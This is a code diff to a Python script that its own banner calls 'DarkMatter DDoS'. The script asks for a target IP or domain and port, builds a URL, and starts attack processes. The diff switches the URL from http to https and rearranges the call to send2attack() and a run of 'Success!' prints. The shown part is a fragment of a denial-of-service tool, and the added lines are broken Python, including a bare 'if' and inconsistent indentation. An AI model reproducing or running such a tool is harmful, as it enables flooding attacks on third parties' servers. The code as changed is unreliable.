@@ -45,7 +45,7 @@ def attack():
 print("Bienvenido a DarkMatter DDoS\n")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
-url = f"http://{str(ip)}" 
+url = f"https://{str(ip)}" 
 print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
@@ -56,11 +56,13 @@ def send2attack():
     mp.setDaemon = False
     mp.start() #Magic Starts
     
-print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+   send2attack()
+  if
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
     
-send2attack()
+
